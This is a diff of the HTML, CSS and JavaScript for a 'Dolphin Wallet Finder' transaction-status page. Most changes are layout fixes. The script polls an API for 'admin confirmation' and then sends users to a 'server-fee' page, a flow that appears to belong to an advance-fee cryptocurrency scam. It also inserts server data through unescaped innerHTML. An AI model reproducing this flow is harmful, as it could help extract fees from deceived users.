@@ -2,274 +2,255 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <!-- Lock width + disable zoom -->
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
+  <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
   <meta name="theme-color" content="#0a1220">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <title>Transaction Status — Dolphin Wallet Finder</title>
 
   <style>
-  /* Hard reset so nothing upstream shifts layout */
-  html, body { margin:0 !important; padding:0 !important; height:100%; }
-  *, *::before, *::after { box-sizing:border-box; }
+    /* --- HARD RESET to defeat parent/hosting CSS --- */
+    html, body { margin:0 !important; padding:0 !important; height:100%; }
+    *, *::before, *::after { box-sizing:border-box; }
+    html, body { transform:none !important; }
+    :root{ --vh: 1vh; }
 
-  :root{
-    --vh: 1vh;            /* updated by JS */
-    --vpad: 16px;         /* computed equal top/bottom padding for true center */
+    /* Theme (unchanged) */
+    :root{
+      --c1:#0ff1e7; --c2:#35a7ff; --c3:#14ff89;
+      --grid:#0e1628;
+      --panel:rgba(10,16,26,.70); --panel2:rgba(6,12,20,.60);
+      --stroke:rgba(64,203,255,.28); --dash:rgba(32,205,255,.20);
+      --muted:rgba(190,245,255,.85); --text:#eafaff;
+      --shadow-lg:0 28px 90px rgba(0,0,0,.65);
+    }
 
-    --c1:#0ff1e7; --c2:#35a7ff; --c3:#14ff89;
-    --grid:#0e1628;
-    --panel:rgba(10,16,26,.70); --panel2:rgba(6,12,20,.60);
-    --stroke:rgba(64,203,255,.28); --dash:rgba(32,205,255,.20);
-    --muted:rgba(190,245,255,.85); --text:#eafaff;
-    --shadow-lg:0 28px 90px rgba(0,0,0,.65);
-  }
+    body{
+      color:var(--text);
+      font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:
+        radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
+        radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
+        linear-gradient(180deg,#0a1220,var(--grid) 42%);
+      overflow:hidden;                 /* page itself doesn't scroll */
+      -webkit-tap-highlight-color:transparent;
+      -webkit-text-size-adjust:100%;
+      touch-action: pan-y;
 
-  body{
-    color:var(--text);
-    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-    background:
-      radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
-      radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
-      linear-gradient(180deg,#0a1220,var(--grid) 42%);
-    overflow-x:hidden;     /* vertical only */
-    overflow-y:auto;
-    -webkit-tap-highlight-color:transparent;
-    -webkit-text-size-adjust:100%;
-    touch-action: pan-y;
+      padding: env(safe-area-inset-top, 0)
+               env(safe-area-inset-right, 0)
+               env(safe-area-inset-bottom, 0)
+               env(safe-area-inset-left, 0);
+    }
 
-    padding: env(safe-area-inset-top, 0)
-             env(safe-area-inset-right, 0)
-             env(safe-area-inset-bottom, 0)
-             env(safe-area-inset-left, 0);
-  }
+    /* Decorative background (optional) */
+    .radar{ position:fixed; inset:0; z-index:-2 }
+    canvas{ position:absolute; inset:0; width:100%; height:100% }
 
-  /* Decorative background */
-  .radar{ position:fixed; inset:0; z-index:-2 }
-  canvas{ position:absolute; inset:0; width:100%; height:100% }
+    /* === CENTERED PANEL (scrolls vertically if needed) === */
+    .shell{
+      position: fixed;
+      /* absolute viewport centering (not affected by ancestors) */
+      top: 50vh; left: 50vw; transform: translate(-50%, -50%);
 
-  /* Stage uses equal top/bottom padding computed by JS to center the panel */
-  .stage{
-    min-height: calc(var(--vh) * 100);
-    padding-block: var(--vpad) var(--vpad);
-    padding-inline: clamp(16px, 3vw, 32px);
-  }
-  @supports (min-height: 100svh){
-    .stage{ min-height: 100svh; } /* modern iOS/Android */
-  }
+      width: min(1200px, 98vw);
+      min-height: 560px;
 
-  /* Main panel (kept intact) */
-  .shell{
-    width:min(1200px,98vw);
-    min-height:560px;
+      display:grid; grid-template-columns:1.05fr 1.45fr;
 
-    display:grid; grid-template-columns:1.05fr 1.45fr;
+      border-radius:28px; overflow:hidden; isolation:isolate;
+      box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
+      background: transparent;
 
-    border-radius:28px; overflow:hidden; isolation:isolate; position:relative;
-    box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
-    margin-inline:auto; /* true horizontal center */
-    background:transparent;
-  }
-  @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
+      /* If content overflows: scroll INSIDE the panel (vertical only) */
+      overflow-x: hidden;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
 
-  .brand-pane{
-    position:relative;
-    background:
-      radial-gradient(900px 600px at 20% 10%, rgba(53,167,255,.22), transparent 60%),
-      radial-gradient(700px 520px at 100% 100%, rgba(20,255,137,.20), transparent 65%),
-      linear-gradient(180deg, rgba(12,22,36,.88), rgba(8,16,28,.78));
-    backdrop-filter: blur(18px) saturate(120%);
-    border-right:1px solid rgba(64,203,255,.18);
-    overflow:hidden;
-  }
-  .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; justify-content:space-between }
-  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
-  .ring{ position:absolute; inset:-12%; border-radius:50%;
-    background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
-    filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
-  }
-  .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
-    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
-  .kicker{ color:var(--muted); line-height:1.8 }
+      /* Cap the panel height to the real viewport height minus padding */
+      max-height: calc(var(--vh) * 100 - 32px);
+    }
 
-  .content-pane{ background:linear-gradient(180deg,var(--panel),var(--panel2)); backdrop-filter: blur(18px) saturate(120%); position:relative; }
-  .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
-  .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
+    /* Prefer modern viewport units when available */
+    @supports (max-height: 100svh){
+      .shell{ max-height: calc(100svh - 32px); }
+    }
+    @supports (max-height: 100lvh){
+      .shell{ max-height: calc(100lvh - 32px); }
+    }
 
-  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
-  .hero p{ color:var(--muted); line-height:1.9; margin:0 }
+    @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
 
-  .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
-  @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
-  .card{ background:linear-gradient(110deg,rgba(0,255,255,.08),rgba(0,40,110,.13)); border:1px solid rgba(64,203,255,.28); border-radius:16px; padding:18px; display:flex; gap:10px; }
+    .brand-pane{
+      position:relative;
+      background:
+        radial-gradient(900px 600px at 20% 10%, rgba(53,167,255,.22), transparent 60%),
+        radial-gradient(700px 520px at 100% 100%, rgba(20,255,137,.20), transparent 65%),
+        linear-gradient(180deg, rgba(12,22,36,.88), rgba(8,16,28,.78));
+      backdrop-filter: blur(18px) saturate(120%);
+      border-right:1px solid rgba(64,203,255,.18);
+      overflow:hidden;
+    }
+    .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; justify-content:space-between }
+    .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
+    .ring{ position:absolute; inset:-12%; border-radius:50%;
+      background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
+      filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
+    }
+    .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
+      background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
+    .kicker{ color:var(--muted); line-height:1.8 }
 
-  .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
+    .content-pane{ background:linear-gradient(180deg,var(--panel),var(--panel2)); backdrop-filter: blur(18px) saturate(120%); position:relative; }
+    .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
+    .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
 
-  .logo-wrap img{ width:100%; height:100%; object-fit:contain; display:block; }
-  @media (max-width:600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
+    .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
+    .hero p{ color:var(--muted); line-height:1.9; margin:0 }
 
-  .label{ color:var(--muted); font-size:.95rem }
-  .mono-box{
-    width:100%; padding:14px 16px; border-radius:14px;
-    background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10));
-    border:1px dashed var(--dash); color:var(--text);
-    font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
-    word-break:break-all
-  }
-  .actions{ margin-top:8px; display:flex; justify-content:center }
-  .btn{ border:none; border-radius:14px; padding:12px 18px; font-weight:800; letter-spacing:.3px; cursor:pointer; background:linear-gradient(95deg,var(--c2),var(--c1)); color:#001019; box-shadow:0 10px 28px rgba(53,167,255,.28); min-width:min(280px,90%); }
-  .btn[disabled]{ opacity:.5; filter:grayscale(.4); cursor:not-allowed }
-  .btn:hover:not([disabled]){ transform:translateY(-1px) }
+    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
+    @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
+    .card{ background:linear-gradient(110deg,rgba(0,255,255,.08),rgba(0,40,110,.13)); border:1px solid rgba(64,203,255,.28); border-radius:16px; padding:18px; display:flex; gap:10px; }
 
-  @keyframes spin{ to{ transform:rotate(1turn) } }
+    .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
+
+    .logo-wrap img{ width:100%; height:100%; object-fit:contain; display:block; }
+    @media (max-width: 600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
+
+    .label{ color:var(--muted); font-size:.95rem }
+    .mono-box{
+      width:100%; padding:14px 16px; border-radius:14px;
+      background:linear-gradient(120deg,rgba(0,255,255,.06),rgba(0,35,80,.10));
+      border:1px dashed var(--dash); color:var(--text);
+      font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      word-break:break-all
+    }
+    .actions{ margin-top:8px; display:flex; justify-content:center }
+    .btn{ border:none; border-radius:14px; padding:12px 18px; font-weight:800; letter-spacing:.3px; cursor:pointer; background:linear-gradient(95deg,var(--c2),var(--c1)); color:#001019; box-shadow:0 10px 28px rgba(53,167,255,.28); min-width:min(280px,90%); }
+    .btn[disabled]{ opacity:.5; filter:grayscale(.4); cursor:not-allowed }
+    .btn:hover:not([disabled]){ transform:translateY(-1px) }
+
+    @keyframes spin{ to{ transform:rotate(1turn) } }
   </style>
 </head>
 <body>
   <div class="radar" aria-hidden="true"></div>
 
-  <main class="stage" role="region" aria-label="Transaction Status Panel">
-    <section class="shell" id="panel">
+  <!-- Centered, scrollable panel -->
+  <section class="shell" role="region" aria-label="Transaction Status Panel">
+    <!-- LEFT / BRAND -->
+    <aside class="brand-pane">
+      <div class="brand-inner">
+        <div>
+          <div class="logo-wrap" aria-hidden="true">
+            <div class="ring"></div>
+            <img src="../assets/logo.png" alt="Dolphin Wallet Logo" />
+          </div>
+          <h1 class="title">Dolphin Wallet</h1>
+          <p class="kicker">Transaction submitted. Status updates appear on the panel.</p>
+        </div>
+      </div>
+    </aside>
 
-      <!-- LEFT / BRAND -->
-      <aside class="brand-pane">
-        <div class="brand-inner">
-          <div>
-            <div class="logo-wrap" aria-hidden="true">
-              <div class="ring"></div>
-              <img src="../assets/logo.png" alt="Dolphin Wallet Logo" />
-            </div>
-            <h1 class="title">Dolphin Wallet</h1>
-            <p class="kicker">Transaction submitted. Status updates appear on the panel.</p>
+    <!-- RIGHT / CONTENT -->
+    <section class="content-pane">
+      <div class="border-glow"></div>
+      <div class="pane-inner">
+        <header class="hero">
+          <h2>Transaction Submitted ✅</h2>
+          <p id="statusText">⏳ Awaiting admin confirmation...</p>
+        </header>
+
+        <div class="grid">
+          <div class="card" style="flex-direction:column">
+            <div class="label">Final Transaction Hash</div>
+            <div class="mono-box" id="txHash">Loading...</div>
+          </div>
+
+          <div class="card" style="flex-direction:column">
+            <div class="label">Wallet Information</div>
+            <div class="mono-box" id="walletInfo">Loading wallet data...</div>
           </div>
         </div>
-      </aside>
-
-      <!-- RIGHT / CONTENT -->
-      <section class="content-pane">
-        <div class="border-glow"></div>
-        <div class="pane-inner">
-          <header class="hero">
-            <h2>Transaction Submitted ✅</h2>
-            <p id="statusText">⏳ Awaiting admin confirmation...</p>
-          </header>
-
-          <div class="grid">
-            <div class="card" style="flex-direction:column">
-              <div class="label">Final Transaction Hash</div>
-              <div class="mono-box" id="txHash">Loading...</div>
-            </div>
-
-            <div class="card" style="flex-direction:column">
-              <div class="label">Wallet Information</div>
-              <div class="mono-box" id="walletInfo">Loading wallet data...</div>
-            </div>
-          </div>
-          <div class="actions">
-            <button class="btn" id="withdrawBtn" disabled>Proceed to Server</button>
-          </div>
+        <div class="actions">
+          <button class="btn" id="withdrawBtn" disabled>Proceed to Server</button>
         </div>
-        <div class="foot">© 2025 DOLPHIN WALLET FINDER. All rights reserved.</div>
-      </section>
+      </div>
+      <div class="foot">© 2025 DOLPHIN WALLET FINDER. All rights reserved.</div>
     </section>
-  </main>
+  </section>
 
-<script>
-  /* Set real viewport unit and equal top/bottom padding to force true center */
-  function setVh(){
-    document.documentElement.style.setProperty('--vh', (window.innerHeight * 0.01) + 'px');
-  }
-
-  function centerByPadding(){
-    const panel = document.getElementById('panel');
-    if(!panel) return;
-
-    // Measure after layout
-    requestAnimationFrame(() => {
-      const vh = window.innerHeight;
-      const rect = panel.getBoundingClientRect();
-      const panelH = rect.height;
-
-      // If panel fits: center = (vh - panelH)/2, min 16px
-      // If not: keep minimal padding so nothing is cropped
-      const pad = Math.max( (vh - panelH) / 2, 16 );
-      document.documentElement.style.setProperty('--vpad', pad + 'px');
-    });
-  }
-
-  function initLayout(){
+  <script>
+    /* Real viewport height (iOS/Android chrome-safe) */
+    function setVh(){
+      const vh = window.innerHeight * 0.01;
+      document.documentElement.style.setProperty('--vh', `${vh}px`);
+    }
     setVh();
-    centerByPadding();
-  }
+    window.addEventListener('resize', setVh, { passive:true });
+    window.addEventListener('orientationchange', setVh, { passive:true });
 
-  // Recompute on events that change geometry
-  window.addEventListener('load', initLayout, { passive:true });
-  window.addEventListener('resize', () => { setVh(); centerByPadding(); }, { passive:true });
-  window.addEventListener('orientationchange', () => { setVh(); centerByPadding(); }, { passive:true });
+    /* App logic (unchanged) */
+    const API_BASE_URL = "https://web-production-13d5a.up.railway.app/api";
+    const token = sessionStorage.getItem("token") || localStorage.getItem("token");
 
-  /* Your existing app logic — unchanged */
-  const API_BASE_URL = "https://web-production-13d5a.up.railway.app/api";
-  const token = sessionStorage.getItem("token") || localStorage.getItem("token");
+    if (!token) {
+      alert("Please log in first.");
+      window.location.href = "login.html";
+    }
 
-  if (!token) {
-    alert("Please log in first.");
-    window.location.href = "login.html";
-  }
+    function loadWalletData() {
+      fetch(`${API_BASE_URL}/my-wallet`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.wallet) {
+          alert("❌ No wallet found. Please scan first.");
+          window.location.href = "scan.html";
+          return;
+        }
+        const wallet = data.wallet;
+        const masked = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
+        document.getElementById("walletInfo").innerHTML = `
+          <strong>Address:</strong> ${masked}\n<br><strong>Balance:</strong> ${wallet.balance}\n<br><strong>Network:</strong> ${wallet.network}\n<br><strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
+        `;
+      })
+      .catch(() => alert("Error loading wallet data."));
+    }
 
-  function loadWalletData() {
-    fetch(`${API_BASE_URL}/my-wallet`, {
-      headers: { "Authorization": "Bearer " + token }
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (!data.wallet) {
-        alert("❌ No wallet found. Please scan first.");
-        window.location.href = "scan.html";
-        return;
-      }
-      const wallet = data.wallet;
-      const masked = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
-      document.getElementById("walletInfo").innerHTML = `
-        <strong>Address:</strong> ${masked}\n<br><strong>Balance:</strong> ${wallet.balance}\n<br><strong>Network:</strong> ${wallet.network}\n<br><strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
-      `;
-      centerByPadding(); // content height may change
-    })
-    .catch(() => alert("Error loading wallet data."));
-  }
+    function loadFinalTx() {
+      fetch(`${API_BASE_URL}/final-tx`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("txHash").innerText = data.tx_hash || "N/A";
+        const withdrawBtn = document.getElementById("withdrawBtn");
 
-  function loadFinalTx() {
-    fetch(`${API_BASE_URL}/final-tx`, {
-      headers: { "Authorization": "Bearer " + token }
-    })
-    .then(res => res.json())
-    .then(data => {
-      document.getElementById("txHash").innerText = data.tx_hash || "N/A";
-      const withdrawBtn = document.getElementById("withdrawBtn");
+        if (data.status === "approved") {
+          document.getElementById("statusText").innerHTML =
+            "✅ Transaction Approved! You can proceed to the Server step.";
+          withdrawBtn.disabled = false;
+          withdrawBtn.onclick = () => { window.location.href = "server-fee.html"; };
+        } else if (data.status === "rejected") {
+          document.getElementById("statusText").innerHTML =
+            "❌ Your transaction was rejected by admin. Please contact support.";
+          withdrawBtn.disabled = true;
+          withdrawBtn.onclick = null;
+        } else {
+          document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
+          withdrawBtn.disabled = true;
+          withdrawBtn.onclick = null;
+        }
+      })
+      .catch(() => alert("Error loading transaction status."));
+    }
 
-      if (data.status === "approved") {
-        document.getElementById("statusText").innerHTML =
-          "✅ Transaction Approved! You can proceed to the Server step.";
-        withdrawBtn.disabled = false;
-        withdrawBtn.onclick = () => { window.location.href = "server-fee.html"; };
-      } else if (data.status === "rejected") {
-        document.getElementById("statusText").innerHTML =
-          "❌ Your transaction was rejected by admin. Please contact support.";
-        withdrawBtn.disabled = true;
-        withdrawBtn.onclick = null;
-      } else {
-        document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
-        withdrawBtn.disabled = true;
-        withdrawBtn.onclick = null;
-      }
-      centerByPadding(); // status text change can shift height
-    })
-    .catch(() => alert("Error loading transaction status."));
-  }
-
-  // Init app data
-  loadWalletData();
-  loadFinalTx();
-  const poll = setInterval(loadFinalTx, 5000);
-</script>
+    // Init
+    loadWalletData();
+    loadFinalTx();
+    const poll = setInterval(loadFinalTx, 5000);
+  </script>
 </body>
 </html>
